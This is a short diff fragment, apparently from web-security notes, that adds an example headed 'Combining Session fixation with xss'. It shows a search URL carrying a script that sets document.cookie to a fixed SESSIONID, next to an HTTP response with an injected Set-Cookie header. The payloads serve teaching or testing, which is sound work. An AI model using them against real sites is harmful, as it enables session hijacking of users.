@@ -68,6 +68,16 @@ Respone
 HTTP /1.1 302 
 Server: host
 Locatoin: https://host/login Set-Cookie:SESSIONID=12345 Dummy-Header: /login
+
+
+            Combining Session fixation with xss 
+https://host/search?q=
+document.cookie="SESSIONID=12345;%20path=/;
+%20domain=.example.com";
+
+
+
+----------------------------------------------------------------------------------------------
  
  
  
